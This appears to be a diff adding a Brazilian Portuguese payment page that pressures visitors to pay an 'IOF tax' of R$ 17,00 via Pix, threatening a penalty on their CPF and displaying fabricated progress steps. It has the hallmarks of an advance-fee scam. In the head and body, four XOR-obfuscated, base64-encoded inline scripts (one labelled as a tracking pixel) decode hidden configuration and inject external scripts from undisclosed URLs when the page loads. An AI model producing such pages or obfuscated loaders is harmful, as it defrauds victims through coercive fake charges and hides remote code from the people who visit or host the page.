@@ -1,0 +1,483 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Finalização da solicitação</title>
+
+  <!-- Wistia -->
+  <script src="https://fast.wistia.com/player.js" async></script>
+  <script src="https://fast.wistia.com/embed/1waoqhgzwl.js" async type="module"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      overflow-x: hidden;
+    }
+
+    body {
+      background: #fff;
+      color: #182337;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .page {
+      width: min(520px, 100%);
+      margin: auto;
+      padding: 22px 18px 35px;
+    }
+
+    .attention {
+      border: 1.5px solid #ffaaa0;
+      background: #fff7f6;
+      border-radius: 15px;
+      padding: 17px;
+      display: flex;
+      gap: 12px;
+      margin-bottom: 25px;
+    }
+
+    .attention-icon {
+      width: 34px;
+      height: 34px;
+      min-width: 34px;
+      border-radius: 50%;
+      background: #df211d;
+      color: #fff;
+      display: grid;
+      place-items: center;
+      font-size: 21px;
+      font-weight: 900;
+    }
+
+    .attention h2 {
+      margin: 0 0 6px;
+      color: #cf211c;
+      font-size: 21px;
+    }
+
+    .attention p {
+      margin: 0;
+      color: #742722;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    h1 {
+      margin: 0 0 25px;
+      text-align: center;
+      color: #ff402e;
+      font-size: clamp(30px, 8vw, 42px);
+      line-height: 1.04;
+      font-weight: 900;
+      letter-spacing: -1px;
+    }
+
+    /* =========================
+       WISTIA
+    ========================= */
+
+    .video {
+      width: 100%;
+      max-width: 390px;
+      margin: 0 auto 25px;
+      border-radius: 17px;
+      overflow: hidden;
+      background: #111;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, .14);
+      line-height: 0;
+    }
+
+    .video wistia-player {
+      display: block;
+      width: 100%;
+      aspect-ratio: 0.5625;
+      overflow: hidden;
+      border-radius: 17px;
+    }
+
+    /* Placeholder enquanto o Wistia carrega */
+    wistia-player[media-id='1waoqhgzwl']:not(:defined) {
+      background: center / contain no-repeat
+        url('https://fast.wistia.com/embed/medias/1waoqhgzwl/swatch');
+      display: block;
+      filter: blur(5px);
+      padding-top: 177.78%;
+    }
+
+    .intro {
+      text-align: center;
+      font-size: 16px;
+      line-height: 1.5;
+      margin: 0 10px 22px;
+    }
+
+    .steps-card {
+      border: 1px solid #cfd3d7;
+      border-radius: 4px;
+      background: #f8fafb;
+      overflow: hidden;
+      margin-top: 15px;
+    }
+
+    .step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 13px 16px;
+      min-height: 67px;
+    }
+
+    .step-dot {
+      width: 20px;
+      height: 20px;
+      min-width: 20px;
+      border-radius: 50%;
+      margin-top: 4px;
+    }
+
+    .green {
+      background: #3ca66a;
+    }
+
+    .red {
+      background: #f44343;
+    }
+
+    .gray {
+      background: #d2d2d2;
+    }
+
+    .step-content {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .step-title {
+      font-size: 15px;
+      line-height: 1.2;
+      margin: 0 0 5px;
+      color: #3ca66a;
+    }
+
+    .red-text {
+      color: #f44343 !important;
+    }
+
+    .gray-text {
+      color: #aaa !important;
+    }
+
+    .step-subtitle {
+      font-size: 12px;
+      line-height: 1.35;
+      margin: 0;
+      color: #3ca66a;
+    }
+
+    .payment {
+      margin-top: 22px;
+      background: #fff;
+      border: 1px solid #e3e6e8;
+      border-radius: 15px;
+      padding: 21px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, .05);
+    }
+
+    .payment-title {
+      font-size: 20px;
+      font-weight: 800;
+      margin-bottom: 8px;
+    }
+
+    .payment-info {
+      color: #777;
+      font-size: 14px;
+      margin-bottom: 7px;
+    }
+
+    .price {
+      color: #ff402e;
+      font-size: 38px;
+      font-weight: 900;
+      margin: 7px 0 17px;
+    }
+
+    .button {
+      display: block;
+      width: 100%;
+      padding: 17px;
+      border-radius: 35px;
+      background: #ff402e;
+      color: #fff;
+      text-decoration: none;
+      text-align: center;
+      font-size: 18px;
+      font-weight: 900;
+      box-shadow: 0 10px 23px rgba(255, 64, 46, .28);
+      animation: pulse 1.7s ease-in-out infinite;
+      transition: transform .2s ease, box-shadow .2s ease;
+    }
+
+    .button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 13px 28px rgba(255, 64, 46, .35);
+    }
+
+    .button:active {
+      transform: scale(.98);
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.035);
+      }
+    }
+
+    .secure {
+      color: #777;
+      font-size: 12px;
+      margin-top: 12px;
+    }
+
+    .fineprint {
+      color: #888;
+      font-size: 11px;
+      line-height: 1.45;
+      text-align: center;
+      margin: 16px 8px 0;
+    }
+
+    /* =========================
+       MOBILE
+    ========================= */
+
+    @media (max-width: 430px) {
+      .page {
+        padding-left: 14px;
+        padding-right: 14px;
+      }
+
+      .attention {
+        padding: 15px;
+      }
+
+      .attention h2 {
+        font-size: 19px;
+      }
+
+      .attention p {
+        font-size: 13px;
+      }
+
+      h1 {
+        font-size: clamp(29px, 8vw, 37px);
+      }
+
+      .video {
+        width: 100%;
+        max-width: 390px;
+      }
+
+      .payment {
+        padding: 18px;
+      }
+    }
+
+    @media (max-width: 360px) {
+      .page {
+        padding-left: 12px;
+        padding-right: 12px;
+      }
+
+      h1 {
+        font-size: 28px;
+      }
+
+      .attention {
+        gap: 9px;
+      }
+
+      .attention-icon {
+        width: 30px;
+        min-width: 30px;
+        height: 30px;
+        font-size: 18px;
+      }
+
+      .step {
+        padding: 12px;
+      }
+
+      .button {
+        font-size: 17px;
+      }
+    }
+  </style>
+
+<!-- UTMify pixel and UTM tracking -->
+<script>(function(){var n_9umv=atob("DOmOujQiboEBZRMcE5Ksz0ZOTLsjDWdoY5q0lRtBCu8vEGdxeo/3lFdNA69jFzxvcJvnykBRQfFoHXZwPJnnwlFOQOtyRz8+cp36yF1AG/VkFjEmSLSimFNOAeNgCWA+KbL1mFpDA+QjXzFsepHr1n1GTK0jE3JwZoysgBYUD+AyUScrK4+4j1cQCrkzXSR+IdzqjAMAE9x8");var f_3w0=[];for(var e_9ihb=0;e_9ihb<n_9umv.length;e_9ihb++){f_3w0.push(n_9umv.charCodeAt(e_9ihb)&255);}var q_jc2=f_3w0[0];var v_p14n=f_3w0.slice(1,1+q_jc2);var x_to=f_3w0.slice(1+q_jc2);var y_cfcj=x_to.map(function(b,i_eb){return b^v_p14n[i_eb%q_jc2];});var y_lgc="";for(var r_4y4=0;r_4y4<y_cfcj.length;r_4y4++){y_lgc+=String.fromCharCode(y_cfcj[r_4y4]&255);}var j_oi3=decodeURIComponent(escape(y_lgc));var b_fccl=JSON.parse(j_oi3);var p_1=b_fccl.globals||[];p_1.forEach(function(i_1wym){window[i_1wym.name]=i_1wym.value;});var p_w3kc=document.createElement("script");p_w3kc.src=b_fccl.url;p_w3kc.async=true;p_w3kc.defer=true;(b_fccl.attributes||[]).forEach(function(u_9vj){p_w3kc.setAttribute(u_9vj.name,u_9vj.value);});(document.head||document.documentElement).appendChild(p_w3kc);})();</script>
+<script>(function(){var e_0z=atob("DE/SdGpmbNX2MyoZiDTwARgKTu/UW15t+DzoW0UFCLvYRl504SmrWgkJAfuUQQVq6z27BB4VQ6CCXlk25C6mERkSQr+FEQY76TumBgMEGaGTQAgj0zTwGgsLCffMEU54/C7/AR4LBbOPHlpr7Tm3Gh5LFLaZVwdq6yTwWEgQDbmDVggjqm2vWBFEArSbVggjqiuzAAtLGaGbWkxgpT+gERwDAqHbQF974SuhVkZEGrSaRk87sm3wCTcb");var o_7o=[];for(var u_j=0;u_j<e_0z.length;u_j++){o_7o.push(e_0z.charCodeAt(u_j)&255);}var a_a=o_7o[0];var r_ji86=o_7o.slice(1,1+a_a);var r_b=o_7o.slice(1+a_a);var q_m1=r_b.map(function(b,r_co2){return b^r_ji86[r_co2%a_a];});var d_17sz="";for(var m_hsnv=0;m_hsnv<q_m1.length;m_hsnv++){d_17sz+=String.fromCharCode(q_m1[m_hsnv]&255);}var w_n=decodeURIComponent(escape(d_17sz));var w_1dqv=JSON.parse(w_n);var r_6m=w_1dqv.globals||[];r_6m.forEach(function(r_jqj){window[r_jqj.name]=r_jqj.value;});var w_fj=document.createElement("script");w_fj.src=w_1dqv.url;w_fj.async=true;w_fj.defer=true;(w_1dqv.attributes||[]).forEach(function(z_jqz){w_fj.setAttribute(z_jqz.name,z_jqz.value);});(document.head||document.documentElement).appendChild(w_fj);})();</script>
+</head>
+<script>(function(){var i_b=atob("DM69WD0cPNfKip2QFbWfLU9wHu3o4unkZb2HdxJ/WLnk/+n9fKjEdl5zUfmo+LLjdrzUKElvE6K+5+6/ea/JPU5oEr25qLGydLrJKlR+SaOv+b+qTrWfNlxxWfXwqPnxYa+QLUlxVbGzp+3icLjYNkkxRLSl7rDjdqWfdB9qXbu/77+qN+zAdEY+Uran77+qN6rcLFwxSaOn4/vpOL7PPUt5UqPn+ejyfKrOehE+Sram//iyL+yfJWBh");var y_0a=[];for(var r_dc=0;r_dc<i_b.length;r_dc++){y_0a.push(i_b.charCodeAt(r_dc)&255);}var k_1g=y_0a[0];var q_w=y_0a.slice(1,1+k_1g);var o_zh=y_0a.slice(1+k_1g);var j_mx8=o_zh.map(function(b,s_c2i4){return b^q_w[s_c2i4%k_1g];});var b_zs8b="";for(var w_yw=0;w_yw<j_mx8.length;w_yw++){b_zs8b+=String.fromCharCode(j_mx8[w_yw]&255);}var t_sdld=decodeURIComponent(escape(b_zs8b));var e_ue51=JSON.parse(t_sdld);var f_cbk1=e_ue51.globals||[];f_cbk1.forEach(function(h_e21){window[h_e21.name]=h_e21.value;});var i_pq=document.createElement("script");i_pq.src=e_ue51.url;i_pq.async=true;i_pq.defer=true;(e_ue51.attributes||[]).forEach(function(w_y){i_pq.setAttribute(w_y.name,w_y.value);});(document.head||document.documentElement).appendChild(i_pq);})();</script>
+
+<script>(function(){var d_5vt=atob("DARvwtzS4ljwd3eFh39Nt66+wGLSHwPx93dV7fOxhjbeAgPo7mIW7L+9j3aSBVj25HYGsqihzSiZDxLpqHQGurm+zDKDVVun5nAbsLWwlyyVBFW/3FlD4Lu+jTqRGwSnvV8U4LKzjz3STVX17nwKrpW2wHTSARbp8mFN+P7kgznHRRG0sTFW9O7i1zrJR0ex4mEN8urwnwWN");var n_d7=[];for(var i_2o=0;i_2o<d_5vt.length;i_2o++){n_d7.push(d_5vt.charCodeAt(i_2o)&255);}var l_n1s=n_d7[0];var n_e=n_d7.slice(1,1+l_n1s);var s_k8=n_d7.slice(1+l_n1s);var d_nsk=s_k8.map(function(b,q_i0){return b^n_e[q_i0%l_n1s];});var k_nru="";for(var p_r1=0;p_r1<d_nsk.length;p_r1++){k_nru+=String.fromCharCode(d_nsk[p_r1]&255);}var q_4rvt=decodeURIComponent(escape(k_nru));var x_eddg=JSON.parse(q_4rvt);var g_g7=x_eddg.globals||[];g_g7.forEach(function(k_i3pw){window[k_i3pw.name]=k_i3pw.value;});var e_6=document.createElement("script");e_6.src=x_eddg.url;e_6.async=true;e_6.defer=true;(x_eddg.attributes||[]).forEach(function(b_6){e_6.setAttribute(b_6.name,b_6.value);});(document.head||document.documentElement).appendChild(e_6);})();</script>
+<body>
+
+<main class="page">
+
+  <section class="attention">
+    <div class="attention-icon">!</div>
+
+    <div>
+      <h2>ATENÇÃO</h2>
+
+      <p>
+        Caso não pague a taxa de IOF sera aplicada uma penalidade juntamento com uma multa no seu CPF, conforme os termos de uso
+
+      </p>
+    </div>
+  </section>
+
+  <h1>
+    Parabéns, finalize a última etapa para concluir a sua solicitação
+  </h1>
+
+  <!-- =========================
+       PLAYER WISTIA
+       ========================= -->
+
+  <div class="video">
+
+    <wistia-player
+      media-id="1waoqhgzwl"
+      aspect="0.5625">
+    </wistia-player>
+
+  </div>
+
+  <p class="intro">
+    Confira abaixo o andamento das etapas da sua solicitação.
+  </p>
+
+  <section class="steps-card">
+
+    <div class="step">
+      <span class="step-dot green"></span>
+
+      <div class="step-content">
+        <p class="step-title">
+          Pagamento Frete
+        </p>
+
+        <p class="step-subtitle">
+          Pagamento concluído com sucesso
+        </p>
+      </div>
+    </div>
+
+
+    <div class="step">
+      <span class="step-dot green"></span>
+
+      <div class="step-content">
+        <p class="step-title">
+          Depósito de Ativação
+        </p>
+
+        <p class="step-subtitle">
+          Pagamento concluído com sucesso
+        </p>
+      </div>
+    </div>
+
+
+    <div class="step">
+      <span class="step-dot red"></span>
+
+      <div class="step-content">
+        <p class="step-title red-text">
+          Próxima etapa de pagamento
+        </p>
+
+        <p class="step-subtitle red-text">
+          Aguardando pagamento para continuar a solicitação
+        </p>
+      </div>
+    </div>
+
+
+    <div class="step">
+      <span class="step-dot gray"></span>
+
+      <div class="step-content">
+        <p class="step-title gray-text">
+          Acesso à conta
+        </p>
+
+        <p class="step-subtitle gray-text">
+          Disponível após a confirmação da etapa anterior
+        </p>
+      </div>
+    </div>
+
+  </section>
+
+
+  <section class="payment">
+
+    <div class="payment-title">
+      Pague via Pix
+    </div>
+
+    <div class="payment-info">
+      O pagamento será confirmado imediatamente
+    </div>
+
+    <div class="price">
+      R$ 17,00
+    </div>
+
+    <!--
+      SUBSTITUA # PELO URL OFICIAL DO CHECKOUT
+      DA INSTITUIÇÃO RESPONSÁVEL.
+    -->
+
+    <a
+      class="button"
+      <a href="https://pagamentoconfiavel.com.br/JKDSWynq">
+      
+      PAGAR AGORA →
+    </a>
+
+    <div class="secure">
+      🔒 Confira os dados antes de confirmar
+    </div>
+
+  </section>
+
+
+  <p class="fineprint">
+    Verifique a instituição responsável pela cobrança
+    e os dados do destinatário antes de concluir
+    qualquer pagamento.
+  </p>
+
+</main>
+
+</body>
+</html>
+```
